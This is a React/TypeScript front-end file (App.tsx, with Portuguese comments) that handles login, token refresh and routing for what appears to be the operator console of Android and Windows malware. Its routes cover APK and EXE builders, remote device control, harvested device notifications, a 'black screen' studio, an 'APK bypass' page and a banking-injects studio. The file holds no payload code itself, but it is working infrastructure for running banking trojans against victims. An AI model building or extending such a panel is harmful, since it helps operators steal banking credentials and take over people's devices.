import { HashRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { useState, useEffect } from 'react';
import LoginPage from './pages/LoginPage';
import Dashboard from './pages/Dashboard';
import DeviceControl from './pages/DeviceControlModern';
import APKBuilder from './pages/APKBuilder';
import APKBuilderSelect from './pages/APKBuilderSelect';
import APKBuilderVisual from './pages/APKBuilderVisual';
import APKStudio from './pages/APKStudio';
import BlackScreenStudioPage from './pages/BlackScreenStudioPage';
import APKBypassIframePage from './pages/APKBypassIframePage';
import AdminLogin from './pages/AdminLogin';
import AdminPanel from './pages/AdminPanel';
import WinBuilder from './pages/WinBuilder';
import WinDeviceControl from './pages/WinDeviceControl';
import LiveOverview from './pages/LiveOverview';
import NotificationsPage from './pages/NotificationsPage';
import SystemLogsPage from './pages/SystemLogsPage';
import DeviceHealthPage from './pages/DeviceHealthPage';
import InjectsStudioPage from './pages/InjectsStudioPage';
import BackgroundAnimation from './components/BackgroundAnimation';
import ErrorBoundary from './components/ErrorBoundary';
import { authAPI } from './services/api';

interface UserInfo {
  id: number;
  username: string;
  is_admin: boolean;
}

function App() {
  // Estado para usuários normais
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [loading, setLoading] = useState(true);
  
  // Estado separado para admin
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState<boolean>(false);
  const [adminInfo, setAdminInfo] = useState<UserInfo | null>(null);

  // Login de usuário normal
  const handleLogin = async (token: string) => {
    localStorage.setItem('token', token);
    try {
      const info = await authAPI.me();
      localStorage.setItem('username', info.username);
      localStorage.setItem('role', info.is_admin ? 'admin' : 'operator');
    } catch (err) {
      console.error('Erro ao buscar info do user após login', err);
    }
    setIsAuthenticated(true);
  };

  // Login de admin (separado)
  const handleAdminLogin = async (token: string) => {
    localStorage.setItem('admin_token', token);
    localStorage.setItem('token', token); // Também salva no token normal para API funcionar
    try {
      const info = await authAPI.me();
      setAdminInfo(info);
      localStorage.setItem('username', info.username);
      localStorage.setItem('role', 'admin');
    } catch (err) {
      console.error('Erro ao buscar info do admin', err);
    }
    setIsAdminAuthenticated(true);
  };

  // Logout de usuário normal
  const handleLogout = () => {
    localStorage.removeItem('token');
    localStorage.removeItem('username');
    localStorage.removeItem('role');
    setIsAuthenticated(false);
  };

  // Logout de admin
  const handleAdminLogout = () => {
    localStorage.removeItem('admin_token');
    localStorage.removeItem('token');
    localStorage.removeItem('username');
    localStorage.removeItem('role');
    setIsAdminAuthenticated(false);
    setAdminInfo(null);
  };


  // Verifica autenticação ao carregar
  useEffect(() => {
    // Safety timer: Força fim do carregamento após 1.5s para evitar tela azul/preta travada
    const safetyTimer = setTimeout(() => {
      setLoading(false);
    }, 1500);

    const checkAuth = async () => {
      try {
        // Verifica token de admin
        const adminToken = localStorage.getItem('admin_token');
        if (adminToken) {
          localStorage.setItem('token', adminToken);
          
          try {
            const refreshResponse = await authAPI.refresh();
            if (refreshResponse.access_token) {
              localStorage.setItem('admin_token', refreshResponse.access_token);
              localStorage.setItem('token', refreshResponse.access_token);
            }
          } catch {
            console.log('Refresh falhou, tentando com token existente...');
          }
          
          try {
            const info = await authAPI.me();
            if (info.is_admin) {
              localStorage.setItem('username', info.username);
              localStorage.setItem('role', 'admin');
              setAdminInfo(info);
              setIsAdminAuthenticated(true);
            }
          } catch (err: any) {
            if (err?.response?.status === 401 || err?.response?.status === 403) {
              localStorage.removeItem('admin_token');
              localStorage.removeItem('token');
            } else {
              setIsAdminAuthenticated(true);
            }
          }
          return;
        }
        
        // Verifica token de usuário normal
        const token = localStorage.getItem('token');
        if (token) {
          try {
            const refreshResponse = await authAPI.refresh();
            if (refreshResponse.access_token) {
              localStorage.setItem('token', refreshResponse.access_token);
            }
          } catch {
            console.log('Refresh falhou, tentando com token existente...');
          }
          
          try {
            const info = await authAPI.me();
            localStorage.setItem('username', info.username);
            localStorage.setItem('role', info.is_admin ? 'admin' : 'operator');
            setIsAuthenticated(true);
          } catch (err: any) {
            if (err?.response?.status === 401) {
              // Só limpa token se o servidor responder explicitamente 401 Não Autorizado
              localStorage.removeItem('token');
              setIsAuthenticated(false);
            } else {
              // Se for erro de rede/servidor caindo, mantém autenticado localmente para não chutar o usuário
              setIsAuthenticated(true);
            }
          }
        }
      } catch (err) {
        console.error('Erro no checkAuth:', err);
      } finally {
        setLoading(false);
        clearTimeout(safetyTimer);
      }
    };
    
    checkAuth();
    return () => clearTimeout(safetyTimer);
  }, []);

  // Refresh token para usuário normal
  useEffect(() => {
    if (!isAuthenticated) return;

    let cancelled = false;

    const refreshToken = async () => {
      try {
        const response = await authAPI.refresh();
        if (!cancelled && response.access_token) {
          localStorage.setItem('token', response.access_token);
        }
      } catch (error: any) {
        if (!cancelled) {
          // Só desloga se for erro 401 (token inválido/expirado)
          if (error?.response?.status === 401) {
            console.error('Token expirado - fazendo logout');
            localStorage.removeItem('token');
            setIsAuthenticated(false);
          } else {
            // Erro de rede - NÃO desloga, tenta novamente depois
            console.warn('Erro de rede ao renovar token, tentando novamente...');
          }
        }
      }
    };

    // Refresh inicial após 1 segundo (dá tempo de carregar)
    const initialTimeout = window.setTimeout(refreshToken, 1000);
    // Refresh periódico a cada 10 minutos
    const interval = window.setInterval(refreshToken, 1000 * 60 * 10);

    return () => {
      cancelled = true;
      window.clearTimeout(initialTimeout);
      window.clearInterval(interval);
    };
  }, [isAuthenticated]);

  // Refresh token para admin
  useEffect(() => {
    if (!isAdminAuthenticated) return;

    let cancelled = false;

    const refreshToken = async () => {
      try {
        const response = await authAPI.refresh();
        if (!cancelled && response.access_token) {
          localStorage.setItem('admin_token', response.access_token);
          localStorage.setItem('token', response.access_token);
        }
      } catch (error: any) {
        if (!cancelled) {
          // Só desloga se for erro 401 (token inválido/expirado)
          if (error?.response?.status === 401) {
            console.error('Token admin expirado - fazendo logout');
            localStorage.removeItem('admin_token');
            localStorage.removeItem('token');
            setIsAdminAuthenticated(false);
            setAdminInfo(null);
          } else {
            // Erro de rede - NÃO desloga, tenta novamente depois
            console.warn('Erro de rede ao renovar token admin, tentando novamente...');
          }
        }
      }
    };

    // Refresh inicial após 1 segundo
    const initialTimeout = window.setTimeout(refreshToken, 1000);
    // Refresh periódico a cada 10 minutos
    const interval = window.setInterval(refreshToken, 1000 * 60 * 10);

    return () => {
      cancelled = true;
      window.clearTimeout(initialTimeout);
      window.clearInterval(interval);
    };
  }, [isAdminAuthenticated]);

  if (loading) {
    return (
      <div className="min-h-screen bg-[#0b1329] flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  return (
    <Router>
      <BackgroundAnimation />
      <Routes>
        {/* ==================== ROTAS DE USUÁRIO NORMAL ==================== */}
        <Route 
          path="/login" 
          element={
            isAuthenticated ? 
            <Navigate to="/dashboard" /> : 
            <ErrorBoundary fallbackTitle="Erro no Login">
              <LoginPage onLogin={handleLogin} />
            </ErrorBoundary>
          } 
        />
        <Route 
          path="/dashboard" 
          element={
            isAuthenticated ? 
            <ErrorBoundary fallbackTitle="Dashboard Panel Error">
              <Dashboard onLogout={handleLogout} />
            </ErrorBoundary> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/overview" 
          element={
            isAuthenticated ? 
            <LiveOverview onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/device/:deviceId" 
          element={
            isAuthenticated ? 
            <ErrorBoundary fallbackTitle="Error loading Device Panel">
              <DeviceControl onLogout={handleLogout} />
            </ErrorBoundary> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/apk-builder" 
          element={
            isAuthenticated ? 
            <APKBuilder onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        
        {/* Rotas do novo APK Builder Visual */}
        <Route 
          path="/build-apk" 
          element={
            isAuthenticated ? 
            <APKBuilderSelect onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/build-apk/quick" 
          element={
            isAuthenticated ? 
            <APKBuilder onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/build-apk/visual" 
          element={
            isAuthenticated ? 
            <APKBuilderVisual /> : 
            <Navigate to="/login" />
          } 
        />
        
        {/* APK Studio - Sistema completo de criação de APK */}
        <Route 
          path="/apk-studio" 
          element={
            isAuthenticated ? 
            <APKStudio /> : 
            <Navigate to="/login" />
          } 
        />

        {/* Notificações dos Dispositivos */}
        <Route 
          path="/notifications" 
          element={
            isAuthenticated ? 
            <NotificationsPage onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />

        {/* Logs do Sistema */}
        <Route 
          path="/logs" 
          element={
            isAuthenticated ? 
            <SystemLogsPage onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />

        {/* Pings & Gerenciamento */}
        <Route 
          path="/device-health" 
          element={
            isAuthenticated ? 
            <DeviceHealthPage onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        {/* Estúdio Injects Bancários */}
        <Route 
          path="/injects-studio" 
          element={
            isAuthenticated ? 
            <InjectsStudioPage /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/black-screen-studio" 
          element={
            isAuthenticated ? 
            <BlackScreenStudioPage /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/apk-bypass" 
          element={
            isAuthenticated ? 
            <APKBypassIframePage /> : 
            <Navigate to="/login" />
          } 
        />
        
        {/* Windows Control & EXE Builder */}
        <Route 
          path="/win-builder" 
          element={
            isAuthenticated ? 
            <WinBuilder onLogout={handleLogout} /> : 
            <Navigate to="/login" />
          } 
        />
        <Route 
          path="/win-device/:deviceId" 
          element={
            isAuthenticated ? 
            <WinDeviceControl /> : 
            <Navigate to="/login" />
          } 
        />
        

        {/* ==================== ROTAS DE ADMIN (SEPARADAS) ==================== */}
        <Route 
          path="/admin" 
          element={
            isAdminAuthenticated && adminInfo?.is_admin ? 
            <AdminPanel onLogout={handleAdminLogout} /> : 
            <AdminLogin onLogin={handleAdminLogin} />
          } 
        />
        
        {/* ==================== ROTA PADRÃO ==================== */}
        <Route 
          path="/" 
          element={<Navigate to={isAuthenticated ? "/dashboard" : "/login"} />} 
        />
      </Routes>
    </Router>
  );
}

export default App;
